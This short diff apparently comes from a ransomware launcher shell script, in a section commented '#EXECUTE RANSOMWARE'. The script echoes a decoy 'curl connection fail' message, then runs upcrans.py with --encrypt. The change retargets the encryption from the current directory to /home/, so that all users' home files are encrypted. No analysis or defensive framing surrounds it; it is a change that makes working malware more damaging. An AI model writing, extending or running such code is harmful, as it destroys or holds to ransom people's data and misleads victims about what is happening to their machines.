@@ -32,7 +32,7 @@ done
 
 #EXECUTE RANSOMWARE
 echo "curl connection fail"
-python upcrans.py --encrypt --path .
+python upcrans.py --encrypt --path /home/
 
 
 #EXECUTE INTERFACE
